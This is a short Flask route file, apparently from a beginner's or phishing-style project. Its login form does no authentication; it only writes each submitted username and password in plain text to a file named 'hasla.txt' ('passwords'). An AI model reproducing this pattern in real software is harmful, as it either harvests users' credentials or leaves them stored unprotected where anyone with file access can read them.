from app import app
from flask import render_template, redirect, url_for, request
from app import form as formularz

@app.route('/', methods=['GET', 'POST'])
def index():
    login = None
    password = None
    form = formularz.LoginForm()
    if request.method == 'POST' and form.validate_on_submit():
        login = form.login.data
        password = form.password.data
        form.login.data = ''
        form.password.data = ''
        zapisz(login, password)
        #return redirect(url_for('index', login=login, form=form))
    return render_template('index.html', login=login, form=form,)


def zapisz(name, password):
    f = open('hasla.txt', mode='a')
    f.write(name + ' ' + password)
    f.close()